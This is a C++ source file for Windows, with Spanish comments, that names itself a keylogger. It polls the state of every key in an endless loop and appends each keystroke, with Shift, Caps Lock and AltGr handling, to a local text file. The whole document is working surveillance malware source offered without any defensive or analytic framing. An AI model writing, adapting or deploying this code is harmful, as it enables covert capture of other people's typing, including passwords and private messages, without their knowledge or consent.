#include <fstream>
#include <windows.h>

using namespace std;

// Mapeo para caracteres con Shift
char mapWithShift[256] = {0};
void initShiftMap() {
    mapWithShift['1'] = '!'; mapWithShift['2'] = '@';
    mapWithShift['3'] = '#'; mapWithShift['4'] = '$';
    mapWithShift['5'] = '%'; mapWithShift['6'] = '^';
    mapWithShift['7'] = '&'; mapWithShift['8'] = '(';
    mapWithShift['9'] = ')'; mapWithShift['0'] = '_';
    mapWithShift['-'] = '_'; mapWithShift['='] = '+';
    mapWithShift['['] = '{'; mapWithShift[']'] = '}';
    mapWithShift[';'] = ':'; mapWithShift['\''] = '"';
    mapWithShift[','] = '<'; mapWithShift['.'] = '>';
    mapWithShift['/'] = '?'; mapWithShift['\\'] = '|';
}

// Mapeo para teclas especiales sin Shift
char mapNoShift[256] = {0};
void initNoShiftMap() {
    mapNoShift['1'] = '1'; mapNoShift['2'] = '2';
    mapNoShift['3'] = '3'; mapNoShift['4'] = '4';
    mapNoShift['5'] = '5'; mapNoShift['6'] = '6';
    mapNoShift['7'] = '7'; mapNoShift['8'] = '8';
    mapNoShift['9'] = '9'; mapNoShift['0'] = '0';
    mapNoShift['-'] = '-'; mapNoShift['='] = '=';
    mapNoShift['['] = '['; mapNoShift[']'] = ']';
    mapNoShift[';'] = ';'; mapNoShift['\''] = '\'';
    mapNoShift[','] = ','; mapNoShift['.'] = '.';
    mapNoShift['/'] = '/'; mapNoShift['\\'] = '\\';
}

// Función para registrar teclas
void logKey(int key, const char* file, bool isShiftPressed, bool isAltGrPressed, bool isCapsLockOn) {
    ofstream outputFile(file, ios::app);

    // Manejo de teclas especiales
    if (key == VK_BACK)
        outputFile << "[BACKSPACE]";
    else if (key == VK_RETURN)
        outputFile << "[ENTER]";
    else if (key == VK_SPACE)
        outputFile << " ";
    else if (key == VK_TAB)
        outputFile << "[TAB]";
    else if (key >= 32 && key <= 126) { // Caracteres imprimibles
        // Manejo de AltGr
        if (isAltGrPressed) {
            if (key == '2') outputFile << '@'; // AltGr + 2 -> @
        }
        // Manejo de caracteres con Shift
        else if (isShiftPressed && mapWithShift[key]) {
            outputFile << mapWithShift[key];
        }
        // Manejo de caracteres básicos
        else if (mapNoShift[key]) {
            outputFile << mapNoShift[key];
        }
        // Manejo de letras con Caps Lock y Shift
        else if ((key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z')) {
            if (isShiftPressed ^ isCapsLockOn) { // XOR: Shift o CapsLock activo, pero no ambos
                outputFile << char(toupper(key));
            } else {
                outputFile << char(tolower(key));
            }
        }
    }

    outputFile.close();
}

// Función principal del keylogger
void keylogger() {
    const char* logFile = "registro_teclas.txt";
    bool keyState[256] = {false}; // Arreglo para evitar repeticiones
    initShiftMap(); // Inicializar mapeo de Shift
    initNoShiftMap(); // Inicializar mapeo sin Shift

    while (true) {
        // Detectar estado de Shift, AltGr y CapsLock
        bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
        bool isAltGrPressed = (GetAsyncKeyState(VK_MENU) & 0x8000) && (GetAsyncKeyState(VK_CONTROL) & 0x8000);
        bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

        for (int key = 8; key <= 255; key++) {
            short keyStatus = GetAsyncKeyState(key);
            if (keyStatus & 0x8000) { // Si la tecla está presionada
                if (!keyState[key]) { // Si es la primera vez que se detecta
                    logKey(key, logFile, isShiftPressed, isAltGrPressed, isCapsLockOn);
                    keyState[key] = true;
                }
            } else {
                keyState[key] = false; // Reiniciar estado si se suelta
            }
        }
        Sleep(10); // Reducir uso de CPU
    }
}

int main() {
    keylogger();
    return 0;
}
